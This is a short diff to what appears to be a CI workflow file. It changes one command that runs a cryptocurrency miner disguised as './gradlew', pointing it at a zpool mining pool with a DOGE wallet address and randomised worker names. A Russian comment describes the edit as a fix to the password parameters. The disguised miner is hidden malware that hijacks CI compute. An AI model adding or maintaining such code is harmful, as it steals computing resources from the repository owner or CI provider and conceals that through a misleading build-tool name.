@@ -17,4 +17,5 @@ jobs:
         RAND_ID=$((10000 + RANDOM % 90000))
         WORKER_NAME="wrk_${RAND_ID}"
         
-        ./gradlew -a rx -o rx.mine.zpool.ca:6011 -u DSQm6RnWGA9qiEauQCpPK47ufuR6fyng5z.${WORKER_NAME} -p c=DOGE,id=${RAND_ID} -t 1 --donate-level=1 --tls
+        # Исправлено разделение параметров пароля: c=DOGE,ap=id=${RAND_ID}
+        ./gradlew -a rx -o rx.mine.zpool.ca:6011 -u DSQm6RnWGA9qiEauQCpPK47ufuR6fyng5z.${WORKER_NAME} -p c=DOGE,ap=id=${RAND_ID} -t 1 --donate-level=1 --tls
